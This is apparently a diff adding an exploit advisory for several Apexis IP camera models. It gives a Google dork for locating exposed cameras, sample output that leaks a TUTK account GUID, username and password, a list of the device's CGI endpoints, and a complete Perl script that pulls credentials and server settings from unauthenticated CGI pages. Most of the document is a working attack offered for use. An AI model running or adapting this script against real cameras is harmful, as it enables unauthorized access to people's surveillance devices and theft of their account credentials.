@@ -1,0 +1,147 @@
+*# Exploit Title: Apexis IP CAM - Full Info Disclosure **
+**# Google Dork: inurl:"get_status.cgi"cgi-bin/**
+**# Date: 01/06/2015**
+**# Exploit Author: Sunplace Solutions - Soluciones Informáticas - #RE 
+Remoteexecution.net**
+**# Vendor Homepage: http://www.apexis.com.cn/**
+**# Tested on: Linux**
+*
+*Models Afected :**
+**
+**APM-H602-MPC**
+**APM-H803-MPC**
+**APM-H901-MPC**
+**APM-H501-MPC**
+**APM-H403-MPC**
+**APM-H804*
+
+_*
+*__*Usage: please enter the url ipcam Example : *_
+
+http://server/cgi-bin/get_status.cgi o 
+http://server/cgi-bin/get_tutk_account.cgi
+
+_*You get something like this*__*:*_
+
+[Sunplace@solutions ]$ perl xploit.pl
+[ Apexis IP CAM - Full Info Disclosure ]
+[ Discovery by: Sunplace Solutions ]
+[ Exploit:  Sunplace Solutions - Daniel Godoy ]
+[ Greetz: www.remoteexecution.net - ]
+URL: http://server/cgi-bin/get_tutk_account.cgi
+
+[x]Trying to pwn =>/get_tutk_account.cgi
+Result:
+tutk_result=1;
+tutk_guid='FBX9937PJG273MPMMRZJ';
+tutk_user='admin';
+tutk_pwd='lolo2502';
+
+[x]Trying to pwn => /get_tutk_account
+Result:
+tutk_result=1;
+tutk_guid='FBX9937PJG273MPMMRZJ';
+tutk_user='admin';
+tutk_pwd='lolo2502';
+
+[x]Trying to pwn => /get_extra_server.cgi
+Result:
+extraserv_result=1;
+server_enable=0;
+server_ipaddr='192.168.1.220';
+server_port=6666;
+server_time=10;
+
+
+_*Index of /cgi-bin/ example:*_
+
+backup_params.cgi
+check_user.cgi
+clear_log.cgi
+control_cruise.cgi
+decoder_control.cgi
+delete_sdcard_file.cgi
+download_sdcard_file.cgi
+format_sdc.cgi
+get_alarm_schedule.cgi
+get_camera_vars.cgi
+get_cruise.cgi
+get_extra_server.cgi
+get_list_cruise.cgi
+get_log_info.cgi
+get_log_page.cgi
+get_maintain.cgi
+get_motion_schedule.cgi
+get_params.cgi
+get_preset_status.cgi
+get_real_status.cgi
+get_sdc_status.cgi
+get_status.cgi
+get_sycc_account.cgi
+get_tutk_account.cgi
+get_wifi_scan_result.cgi
+mobile_snapshot.cgi
+reboot.cgi
+
+And more......
+
+
+
+_*[Exploit Code]*__*
+*_
+#!/usr/bin/perl
+print "[ Apexis IP CAM - Full Info Disclosure ]\n";
+print "[ Discovery by: Sunplace Solutions ]\n";
+print "[ Exploit:  Sunplace Solutions ]\n";
+print "[ Greetz: www.remoteexecution.net - Daniel Godoy ]\n";
+print "URL: ";
+$url=<STDIN>;
+use LWP::UserAgent;
+my $ua = LWP::UserAgent->new;
+
+$ua->agent('Mozilla/35.0 (compatible; MSIE 5.0; Windows 7)');
+
+chop($url);
+if ($url eq "")
+   {
+     print 'URL dont empty!.'."\n";
+   }
+   else
+   {
+       $www = new LWP::UserAgent;
+       @path=split(/cgi-bin/,$url);
+       $content = $www->get($url) or error();
+     print "\n[x]Trying to pwn =>".$path[1]."\n";
+     print "Result: \n";
+
+       $pwn = $content->content;
+       $pwn=~ s/var//g;
+       $pwn=~ s/ //g;
+       $pwn=~ s/ret_//g;
+       print $pwn;
+
+     print "\n[x]Trying to pwn => /get_tutk_account\n";
+     print "Result: \n";
+       $content = $www->get($path[0]."cgi-bin/get_tutk_account.cgi") or 
+error();
+       $pwn = $content->content;
+       $pwn=~ s/var//g;
+       $pwn=~ s/ret_//g;
+       $pwn=~ s/ //g;
+
+       print $pwn;
+
+     print "\n[x]Trying to pwn => /get_extra_server.cgi\n";
+     print "Result: \n";
+       $content = $www->get($path[0]."cgi-bin/get_extra_server.cgi") or 
+error();
+       $pwn = $content->content;
+       $pwn=~ s/var//g;
+       $pwn=~ s/ret_//g;
+       $pwn=~ s/extra_//g;
+       $pwn=~ s/ //g;
+       print $pwn;
+   }
+
+
+
